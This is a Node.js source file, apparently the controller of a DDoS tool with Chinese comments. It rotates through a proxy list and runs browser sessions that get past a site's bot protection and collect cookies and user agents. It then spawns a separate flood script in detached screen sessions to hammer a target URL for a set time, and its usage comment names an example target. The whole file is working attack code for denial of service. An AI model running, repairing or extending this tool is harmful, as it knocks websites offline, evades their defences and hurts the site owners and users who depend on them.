require('events').EventEmitter.defaultMaxListeners = 0;
require('colors');
const fs = require('fs');
const { Command } = require('commander');
const { solving } = require('./solver');
const { execSync } = require('child_process');
const program = new Command();
program
    .requiredOption('-u, --url <string>', '目标网址')
    .option('-p, --proxy <proxyfile>', '代理列表文件路径或 none')
    .option('-r, --req <number>', parseInt, 10)
    .option('-t, --threads <number>', parseInt, 1)
    .option('-s, --time <number>', parseInt, 60)
    .option('-d, --debug', '调试模式，输出详细日志')
    .option('-c, --close', '失败自动停用代理')
    .option('-o, --optimize', '拦截字体加载提升速度');
program.parse();

//node main.js -u https://dstatlove.xyz/hit -p proxy.txt -t 30 -r 10 -d -s 300

const options = program.opts();
const target_url = options.url;
const proxyFile = options.proxy;
const browsernum = options.threads || 1;
const reqs = options.req || 30;
const duration = options.time || 60;
const debug = !!options.debug;
const closeOnFail = !!options.close;
const optimize = !!options.optimize;

let proxies = [];
if (proxyFile === 'none') {
    proxies = [undefined];
} else if (proxyFile) {
    proxies = fs.readFileSync(proxyFile, 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);
}
if (proxies.length === 0) proxies = [undefined];

let sessions = [];
let activeSessions = 0;
let proxyIdx = 0;
const failedProxies = new Set();

function proxyToKey(proxy) {
    if (!proxy) return 'none';
    return String(proxy).trim();
}


function startFlood({
  url,
  ip,
  ua,
  cookie,
  time,
  rate,
  threads = 10,
}) {
  const args = [
    'node nflood.js',
     `"${url}"`,
    String(time),
    String(threads),
     `"${ip}"`,
   String(reqs),
    `"${cookie}"`,
    `"${ua}"`,

    
    
  ].filter(Boolean).join(' ');

  const cmd = `screen -dm ${args}`;
   console.log('[CMD]', cmd);

  // 执行
  execSync(cmd);
}


function sessionLog(proxy, msg, level = 'info') {
    let proxyStr = (proxy || 'N/A').cyan.bold;
    let out;
    if (level === 'error') {
        out = ' BROWSER '.white.bold.bgRed + ` | `.red + `(${proxyStr})`.red + ' | '.red + msg.red.bold;
    } else if (level === 'warn') {
        out = ' BROWSER '.black.bold.bgYellow + ` | `.yellow + `(${proxyStr})`.yellow + ' | '.yellow + msg.yellow.bold;
    } else if (level === 'debug') {
        if (!debug) return;
        out = ' BROWSER '.white.bold.bgGray + ` | `.grey + `(${proxyStr})`.grey + ' | '.grey + msg.grey;
    } else {
        out = ' BROWSER '.black.bold.bgGreen + ` | `.green + `(${proxyStr})`.green + ' | '.white.bold + msg;
    }
    console.log(out);
}

async function launchSession(_, randed) {
    activeSessions++;
    let proxyKey = proxyToKey(randed);
    try {
        const result = await solving({
            url: target_url,
            proxy: randed,
            optimize,
            log: (m) => sessionLog(randed, m, 'debug'),
        });

        if (!result || !result.valid) {
            sessionLog(
                randed,
                `未检测到防护 Restart~ | Reason: ${result.reason || ''}`,
                'warn'
            );
            if (closeOnFail && randed !== undefined) {
                failedProxies.add(proxyKey);
                sessionLog(randed, `已自动移除失效代理: ${proxyKey}`, 'warn');
            }
            activeSessions--;
            tryFillSessions();
            return;
        }
       // sessionLog(randed, `Title: ${result.title} | Cookie: ${result.cookie}`, 'debug');
           startFlood({
            url: target_url,ip: proxyKey,ua: result.ua, cookie: result.cookie, time: duration, rate: reqs, threads: 30,
            });
        sessions.push({
            proxy: randed,
            cookie: result.cookie,
            title: result.title,
        });
    } catch (e) {
       // sessionLog(randed, `❌ ${e}`, 'error');
        if (closeOnFail && randed !== undefined) {
            failedProxies.add(proxyKey);
            sessionLog(randed, `已自动移除失效代理: ${proxyKey}`, 'warn');
        }
    }
    activeSessions--;
    tryFillSessions();
}

async function tryFillSessions() {
    while (activeSessions < browsernum) {
        let randed = undefined;
        if (proxies.length > 1) {
            while (proxyIdx < proxies.length && failedProxies.has(proxyToKey(proxies[proxyIdx]))) {
                proxyIdx++;
            }
            if (proxyIdx >= proxies.length) {
                console.log('[MAIN] 代理池耗尽/全部浏览器结束，进程退出'.white.bold.bgRed);
                process.exit(0);
            }
            randed = proxies[proxyIdx++];
        } else {
            randed = proxies[0];
        }
        launchSession(proxyIdx, randed);
    }
}


function Kill_FLOOD() {
    try {
         execSync(`pkill -f 'screen'`);
         execSync(`pkill -f 'chrome'`);
    } catch (e) {
    }
}

process.on('SIGINT', () => {
    console.log('\n[MAIN] 检测到 Ctrl+C，准备退出并清理所有 flood ...'.red.bold);
    Kill_FLOOD();
    process.exit(0);
});


(async () => {
    console.log(
        '[@CORE_888]'.white.bold.bgMagenta
        + ' | '.grey + '并发: '.grey + String(browsernum).bold.green
        + ' | '.grey + '持续: '.grey + (duration + 's').bold.cyan
        + ' | '.grey + 'DEBUG MODE: '.grey + (debug ? 'ON'.bold.yellow : 'OFF'.bold.gray)
    );
    tryFillSessions();

    setTimeout(() => {
        console.log('[MAIN] 进程退出'.white.bold.bgMagenta);
        process.exit(0);
    }, duration * 1000);
})();
